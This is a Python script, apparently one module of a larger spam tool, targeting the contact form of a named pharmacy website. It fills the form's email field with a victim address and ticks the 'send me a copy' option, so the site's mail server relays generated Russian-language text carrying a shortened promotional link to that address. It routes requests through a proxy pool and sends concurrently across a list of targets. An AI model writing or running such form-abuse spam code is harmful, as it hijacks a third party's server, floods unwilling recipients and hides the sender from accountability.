import requests

import module

url = 'http://herysonpharma.com/contact.php'

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'max-age=0',
    'Origin': 'http://herysonpharma.com',
    'Proxy-Connection': 'keep-alive',
    'Referer': 'http://herysonpharma.com/contact.php',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
}


class ConcreteSpam(module.Spam):

    def post(self, target) -> requests.Response:
        text = self.get_text()
        data = {
            'name': text,
            'email': target,
            'phone': text,
            'subject': text.encode(),
            'message': text,
            'yourself': 'on',
            'Submit': 'Send Email',
        }

        response = requests.post(url, headers=headers, data=data, verify=False, proxies=self.get_proxies())
        return response


if __name__ == '__main__':
    project_name = 'herysonpharma'
    success_message = ''

    target_pool_name = 'mixru'
    target_pool: module.Pool = module.TargetServerFactory.get_pool(factory_name=target_pool_name)
    proxy_pool_name = 'checked'
    proxy_pool: module.Pool = module.ProxyServerFactory.get_pool(factory_name=proxy_pool_name)
    target_lang = 'ru'
    text: module.Text = module.Text(text_lang=target_lang)

    project_controller: module.ProjectController = module.ProjectServerControllerCached(project_name=project_name)
    promo_link: str | None = project_controller.retrieve_attached_link()
    if not promo_link:
        promo_link = module.LinkShortner.get_link(target_pool_name)

    project_controller.prom_link = promo_link
    project_controller.get_status()

    spam = ConcreteSpam(project_controller, proxy_pool, target_pool, text, success_message)
    res = spam.send_post()
    if res:
        spam.run_concurrently()
